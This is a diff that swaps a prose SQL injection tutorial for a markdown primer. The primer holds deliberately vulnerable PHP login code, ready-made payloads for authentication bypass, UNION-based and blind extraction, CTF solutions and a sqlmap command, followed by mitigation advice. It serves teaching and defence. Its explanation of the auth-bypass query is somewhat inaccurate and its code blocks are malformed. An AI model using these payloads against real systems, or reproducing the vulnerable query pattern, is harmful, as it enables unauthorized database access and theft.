@@ -1,73 +1,90 @@
-How to detect SQL injection vulnerabilities
-You can detect SQL injection manually using a systematic set of tests against every entry point in the application. To do this, you would typically submit:
+# SQL Injection (SQLi)
 
-The single quote character ' and look for errors or other anomalies.
-Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
-Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses.
-Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
-OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.
-Alternatively, you can find the majority of SQL injection vulnerabilities quickly and reliably using Burp Scanner.
+## Overview
+SQL Injection is a web security vulnerability that allows attackers to interfere with database queries by injecting malicious SQL code through user input fields. It consistently ranks in the OWASP Top 10 and can lead to unauthorized data access, data manipulation, and complete system compromise.
 
-SQL injection in different parts of the query
-Most SQL injection vulnerabilities occur within the WHERE clause of a SELECT query. Most experienced testers are familiar with this type of SQL injection.
+## How SQL Injection Works
 
-However, SQL injection vulnerabilities can occur at any location within the query, and within different query types. Some other common locations where SQL injection arises are:
+### Vulnerable Code Example
+```php
+$username = $_POST['username'];
+$password = $_POST['password'];
+$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
+$result = mysqli_query($conn, $query);
+This code directly concatenates user input into the SQL query without validation or sanitization.
 
-In UPDATE statements, within the updated values or the WHERE clause.
-In INSERT statements, within the inserted values.
-In SELECT statements, within the table or column name.
-In SELECT statements, within the ORDER BY clause.
-SQL injection examples
-There are lots of SQL injection vulnerabilities, attacks, and techniques, that occur in different situations. Some common SQL injection examples include:
+Basic Attack Vectors
+Authentication Bypass
+Payload: admin' OR '1'='1
+Resulting Query: SELECT * FROM users WHERE username='admin' OR '1'='1' AND password=''
+Impact: The condition '1'='1' is always true, bypassing authentication.
 
-Retrieving hidden data, where you can modify a SQL query to return additional results.
-Subverting application logic, where you can change a query to interfere with the application's logic.
-UNION attacks, where you can retrieve data from different database tables.
-Blind SQL injection, where the results of a query you control are not returned in the application's responses.
-Retrieving hidden data
-Imagine a shopping application that displays products in different categories. When the user clicks on the Gifts category, their browser requests the URL:
+Union-Based Injection
+Payload: ' UNION SELECT NULL, username, password FROM admin_users--
+Purpose: Extract data from other tables by combining results with UNION.
 
-https://insecure-website.com/products?category=Gifts
-This causes the application to make a SQL query to retrieve details of the relevant products from the database:
+Time-Based Blind SQLi
+Payload: ' OR IF(1=1, SLEEP(5), 0)--
+Detection: If the response is delayed by 5 seconds, injection is successful.
 
-SELECT * FROM products WHERE category = 'Gifts' AND released = 1
-This SQL query asks the database to return:
+Boolean-Based Blind SQLi
+Payload: ' AND 1=1-- (true condition)
+Payload: ' AND 1=2-- (false condition)
+Detection: Compare responses to infer database structure.
 
-all details (*)
-from the products table
-where the category is Gifts
-and released is 1.
-The restriction released = 1 is being used to hide products that are not released. We could assume for unreleased products, released = 0.
+CTF Challenge Scenarios
+Challenge 1: Login Bypass
+Objective: Bypass authentication on a login form.
+Hint: Try SQL comments (--, #) to ignore password checks.
+Solution: Username: admin'--, Password: (anything)
 
-The application doesn't implement any defenses against SQL injection attacks. This means an attacker can construct the following attack, for example:
+Challenge 2: Extract Hidden Data
+Objective: Retrieve the admin password from the database.
+Hint: Use UNION to combine query results.
+Solution: ' UNION SELECT 1,username,password FROM users WHERE role='admin'--
 
-https://insecure-website.com/products?category=Gifts'--
-This results in the SQL query:
+Challenge 3: Blind SQLi Flag Extraction
+Objective: Extract the flag character by character using time delays.
+Technique: ' OR IF(SUBSTRING((SELECT flag FROM secrets),1,1)='f', SLEEP(2), 0)--
 
-SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
-Crucially, note that -- is a comment indicator in SQL. This means that the rest of the query is interpreted as a comment, effectively removing it. In this example, this means the query no longer includes AND released = 1. As a result, all products are displayed, including those that are not yet released.
+Detection Methods
+Manual Testing
+Input special characters: ', ", ;, --, /**/
 
-You can use a similar attack to cause the application to display all the products in any category, including categories that they don't know about:
+Look for SQL error messages
 
-https://insecure-website.com/products?category=Gifts'+OR+1=1--
-This results in the SQL query:
+Test boolean conditions: ' AND 1=1-- vs ' AND 1=2--
 
-SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
-The modified query returns all items where either the category is Gifts, or 1 is equal to 1. As 1=1 is always true, the query returns all items.
+Time-based payloads: ' OR SLEEP(5)--
 
-Warning
-Take care when injecting the condition OR 1=1 into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, it can result in an accidental loss of data.
+Automated Tools
+sqlmap: sqlmap -u "http://target.com/page?id=1" --batch --banner
 
-LAB
-APPRENTICE
-SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
-Subverting application logic
-Imagine an application that lets users log in with a username and password. If a user submits the username wiener and the password bluecheese, the application checks the credentials by performing the following SQL query:
+Burp Suite: Use Scanner and Intruder for payload injection
 
-SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
-If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.
+Mitigation Strategies
+1. Parameterized Queries (Prepared Statements)
+text
+$stmt = $conn->prepare("SELECT * FROM users WHERE username=? AND password=?");
+$stmt->bind_param("ss", $username, $password);
+$stmt->execute();
+2. Input Validation
+python
+import re
+if not re.match("^[a-zA-Z0-9_]+$", username):
+    raise ValueError("Invalid username")
+3. Least Privilege Principle
+Grant database users only necessary permissions. Never use root or admin accounts for web applications.
 
-In this case, an attacker can log in as any user without the need for a password. They can do this using the SQL comment sequence -- to remove the password check from the WHERE clause of the query. For example, submitting the username administrator'-- and a blank password results in the following query:
+4. Web Application Firewall (WAF)
+Deploy WAF rules to detect and block common SQLi patterns.
 
-SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
-This query returns the user whose username is administrator and successfully logs the attacker in as that user.
+5. Error Handling
+Never display raw SQL errors to users. Log errors server-side only.
+
+OWASP Resources
+OWASP SQL Injection Prevention Cheat Sheet
+
+OWASP Testing Guide: Testing for SQL Injection
+
+OWASP Top 10 2021: A03 Injection
